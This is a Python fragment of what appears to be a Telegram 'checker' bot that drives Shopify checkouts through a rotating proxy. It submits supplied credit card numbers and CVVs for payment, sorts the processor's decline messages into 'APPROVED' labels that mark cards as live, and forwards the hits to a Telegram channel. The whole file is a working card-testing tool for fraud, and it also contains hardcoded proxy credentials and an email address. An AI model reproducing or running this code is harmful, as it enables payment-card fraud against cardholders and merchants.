    session.proxys = {"htpps": "http://ebrnoiak-rotate:30gu8jrxwi1j@p.webshare.io:80"}
    print(f"\n</> INICIADO...")
    #-----------PASO N° 1 REEMPLAZAR ID DEL PRODUCTO-----------#
        #--------ID DEL PRODUCTO ---------#
    payload_1 = {'id': f'{p_id}'}
    print(payload_1)
        
    #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
    print(domain)

    req1 = session.post(url=f'https://{domain}/cart/add.js', data=payload_1)
    
    print(req1)
    
    print("</> PRODUCTO AGREGADO AL CARRIDO")
    req3 = session.post(url=f"https://{domain}/checkout/")
    
    checkout_url = req3.url
    print("</> CHECKOUT URL:", checkout_url) 
    
    print(price)
    #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
    
    reb = session.get(checkout_url).text
    
    

    
    #obtiene la informacion de direccion
    adds = BeautifulSoup(reb, 'html.parser').find('div', {'class':'field__input-wrapper field__input-wrapper--select'})
    add = str(adds).strip()
    
    try:
        
        if "United States" in add or "None" in add:
            addres = "4624 NW 74th Ave Unit 4, code: D01-24062"
            city = "Doral"
            state = "FL"
            zip = "33166"
            phone = "(305) 599-3939"
            dicc = "United States"
        
        elif "United States" in add:
            addres = "4624 NW 74th Ave Unit 4, code: D01-24062"
            city = "Doral"
            state = "FL"    
            zip = "33166"
            phone = "(305) 599-3939"
            dicc = "United States"
        
        elif "United States" in add:
            addres = "4624 NW 74th Ave Unit 4, code: D01-24062"
            city = "Doral"
            state = "FL"
            zip = "33166"
            phone = "(305) 599-3939"
            dicc = "United States"
            
        elif "United States" in add:
            addres = "4624 NW 74th Ave Unit 4, code: D01-24062"
            city = "Doral"
            state = "FL"
            zip = "33166"
            phone = "(305) 599-3939"
            dicc = "United States"

    except:
        addres = "4624 NW 74th Ave Unit 4, code: D01-24062"
        city = "Doral"
        state = "FL"
        zip = "33166"
        phone = "(305) 599-3939"
        dicc = "United States"
    
    print("Addres seclecte:", addres)
    
    atoken = get_random_string(86)
    headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
    }

        #-----------PASO N° 4 REEMPLAZAR PAYLOAD #2-------ya----#
    payload_2 = [
    ('_method', 'patch'),
    ('authenticity_token', f'{atoken}'),
    ('previous_step', 'contact_information'),
    ('step', 'shipping_method'),
    ('checkout[email]', 'darwindevoficial@gmail.com'),
    ('checkout[buyer_accepts_marketing]', '0'),
    ('checkout[shipping_address][first_name]', ''),
    ('checkout[shipping_address][last_name]', ''),
    ('checkout[shipping_address][company]', ''),
    ('checkout[shipping_address][address1]', ''),
    ('checkout[shipping_address][address2]', ''),
    ('checkout[shipping_address][city]', ''),
    ('checkout[shipping_address][country]', ''),
    ('checkout[shipping_address][province]', ''),
    ('checkout[shipping_address][zip]', ''),
    ('checkout[shipping_address][phone]', ''),
    ('checkout[shipping_address][country]', f'{dicc}'),
    ('checkout[shipping_address][first_name]', 'Anna'),
    ('checkout[shipping_address][last_name]', 'Smith'),
    ('checkout[shipping_address][company]', ''),
    ('checkout[shipping_address][address1]', f'{addres}'),
    ('checkout[shipping_address][address2]', ''),
    ('checkout[shipping_address][city]', f'{city}'),
    ('checkout[shipping_address][province]', f'{state}'),
    ('checkout[shipping_address][zip]', f'{zip}'),
    ('checkout[shipping_address][phone]', f'{phone}'),
    ('checkout[remember_me]', 'false'),
    ('checkout[remember_me]', '0'),
    ('checkout[client_details][browser_width]', '432'),
    ('checkout[client_details][browser_height]', '780'),
    ('checkout[client_details][javascript_enabled]', '1'),
    ('checkout[client_details][color_depth]', '24'),
    ('checkout[client_details][java_enabled]', 'false'),
    ('checkout[client_details][browser_tz]', '300'),
]

    req4 = session.post(url=checkout_url, headers=headers, data=payload_2)
    
    
    #obtener el valor de envio
    point4 = session.get(url=checkout_url+"?previous_step=contact_information&step=shipping_method").text
    
    if "data-shipping-method" in point4:
        try:
            price_send = BeautifulSoup(point4, 'html.parser').find("div", {"class":"radio-wrapper"})["data-shipping-method"]
            
        except:
            price_send = "shopify-UPS%20Ground%20Shipping-0.00"
    else:
        price_send = "shopify-UPS%20Ground%20Shipping-0.00"
    
    print(f"\nSHIPP PRICE:", price_send)
    
    #
    #
    time.sleep(3)
        
        #-----------PASO N° 5 REEMPLAZAR PAYLOAD #3----ya-------#
    payload_3 = {
    '_method': 'patch',
    'authenticity_token': f'{atoken}',
    'previous_step': 'shipping_method',
    'step': 'payment_method',
    'checkout[shipping_rate][id]': f'{price_send}',
    'checkout[client_details][browser_width]': '432',
    'checkout[client_details][browser_height]': '780',
    'checkout[client_details][javascript_enabled]': '1',
    'checkout[client_details][color_depth]': '24',
    'checkout[client_details][java_enabled]': 'false',
    'checkout[client_details][browser_tz]': '300',
}
         
    req5 = session.post(url=checkout_url,headers=headers,data=payload_3)
    
    point7 = session.get(url=checkout_url+"?previous_step=shipping_method&step=payment_method",).text
    print(2)
    
    #obtine valor de precio = total_prices
    pricos = BeautifulSoup(point7, 'html.parser').find("span", {"class":"order-summary__emphasis total-recap__final-price skeleton-while-loading"})
    
    total_prices = str(pricos).strip()
    
    
    #se trata de obtener el id del gateway de la pagina
    try:
        idpay = BeautifulSoup(point7, 'html.parser').find("ul", {"role":"list"})['data-brand-icons-for-gateway']# error is shopay not shopify
    except:
        msg = 'DECLINED ❌'
        respuesta = "Error get id Gateway, Change Your site."
        total_prices = ""
        print(msg, total_prices)
        proxyy = "DEAD 🟥"
        gateway = f'<code>{datos[0]}</code>'
        end = time.time()
        tiempo = str(inicio - end)[1:5]
        session.close()  
        return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

 
    
    
    #precio final con el envio para ingresar al requests
    price_final = BeautifulSoup(point7, 'html.parser').find("span", {"class":"order-summary__emphasis total-recap__final-price skeleton-while-loading"})['data-checkout-payment-due-target']
    
    print(f"Gateway id: {idpay}\nTotal: {price_final}")
    #
    #
        
    time.sleep(3)
    payload_4 = {
            "credit_card": {
                "number": f"{ccn[0:4]} {ccn[4:8]} {ccn[8:12]} {ccn[12:16]}",
                "name": "Sin Rol",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            #-----------PASO N° 6 REEMPLAZAR URL DEL SESSION-------ya----#
            "payment_session_scope": f"{domain}"
    }

    req6 = session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4)
    token = req6.json()
    id_ = token.get('id')
    print("</> ID SESSION:", id_)
    time.sleep(2)

        #-----------PASO N° 7 REEMPLAZAR PAYLOAD #5-----------#
    payload_5 = {
    '_method': 'patch',
    'authenticity_token': f'{atoken}',
    'previous_step': 'payment_method',
    'step': '',
    's': f'{id_}',
    'checkout[payment_gateway]': f'{idpay}',
    'checkout[credit_card][vault]': 'false',
    'checkout[different_billing_address]': 'false',
    'checkout[total_price]': f'{price_final}',
    #'checkout_submitted_request_url': 'https://www.toyworld.com.au/34943795332/checkouts/ddaa84bcd63a91d90cdb3f01bdb26fa9?previous_step=shipping_method&step=payment_method',
    #'checkout_submitted_page_id': '682d1a61-2B8E-4933-312D-11A2ADE038F9',
    'complete': '1',
    'checkout[client_details][browser_width]': '432',
    'checkout[client_details][browser_height]': '780',
    'checkout[client_details][javascript_enabled]': '1',
    'checkout[client_details][color_depth]': '24',
    'checkout[client_details][java_enabled]': 'false',
    'checkout[client_details][browser_tz]': '300',
}
    req7 = session.post(url=checkout_url, headers=headers, data=payload_5)
        
    time.sleep(4)

    processing_url = req7.url
    print("</> PROCESANDO URL:",processing_url)
    time.sleep(4)
        
    req8 = session.get(str(processing_url) + '?from_processing_page=1')
    time.sleep(4)

    req9 = session.get(req8.url)
    time.sleep(1)
    text_resp = req9.text
    resp = find_between(text_resp, 'notice__text">', '<')
    
    print("Resultado Previo:", resp)

    session.close()
    
    end = time.time()
    tiempo = str(inicio - end)[1:5]
        
    #-----------PASO N° 8 REEMPLAZAR RESPONSES DEPENDIENDO EL TIPO DE SHOPIFY-----------#

    cv = ["CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.", "2010 Card Issuer Declined CVV", "Card Issuer Declined CVV", "Security code was not matched by the processor", "CVV2 Mismatch", "CVV Validation Error  Failed", "Security codes does not match correct format (3-4 digits)"]
    #
    
    if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):
        msg = f"APPROVED CHARGE ${price}✅"
        resp = 'Charge'
    
    elif "CVV2/CID/CVC2 Data not Verified" in resp:
        msg = f"APPROVED CCN ✅"
                
    elif "Insufficient Funds" in resp:
        msg = f"APPROVED Low Charge✅ "
                    

    elif resp in cv:
        msg =f"APPROVED CCN ✅"
            
    elif "Address not Verified" in resp:
        msg = f"Approved ✅"

    elif not resp:
        msg = f"Declined❌"#en caso de que el contenedor de la respuesta este vacia.
        
    elif '/3d_secure_2/' in str(req9.url):
                    respuesta = '3d_secure_2'
                    msg = "APPROVED 3D✅"
                    
    elif "Security code was not matched by the processor" in resp:
                    msg = "APPROVED ✅"
                    respuesta = resp
                
    elif "Insufficient Funds" in resp:
                    msg = "APPROVED ✅"
                    respuesta = resp
                    
                    
    elif "Transaction Normal - Insufficient Funds" in resp:
                    msg = "APPROVED ✅"
                    respuesta = resp
                    
    elif "CVV2/VAK Failure (531)" in resp:
                    msg = "APPROVED ✅"
                    respuesta = resp
   
    elif "CVV2/CID/CVC2 Data not Verified - Declined" in resp:
                    msg = "APPROVED CCN✅"
                    respuesta = resp
                

    elif "Address not Verified - Insufficient Funds" in resp:
                    msg = "APPROVED ✅"
                    respuesta = resp

                    
    elif "CVV2/CID/CVC2 Data not Verified - Insufficient Funds" in resp:
                    msg = "APPROVED CVV✅"
                    respuesta = resp
                    
    elif "Address not Verified - Approved" in resp:
                    msg = "APPROVED AVS✅"
                    respuesta = "AVS MISMATCH /", resp

    elif "Security codes does not match correct format (3-4 digits)" in resp:
                    msg = "APPROVED CCN✅"
                    respuesta = resp

    else:
                    msg = "DECLINED ❌"    
                    respuesta = resp    

 
    print(f"CC: {tarjeta}\nRespo: {msg}")
    
    proxyy = "LIVE 🟩" 
    if "APPROVED" in msg:
        
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, resp, 'AutpShop', tiempo, username, datos[0], proxyy))
        

    proxyy = "LIVE 🟩" 
    print("checking currier")
    
    loading_message.edit_text(f"""<a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a><b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{datos[0]} ${price}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>{msg}</b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ {resp}
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Proxy  ↯ <code>{proxyy}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Time taken ↯ <code>{tiempo} (segundos)</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5 </b>""")
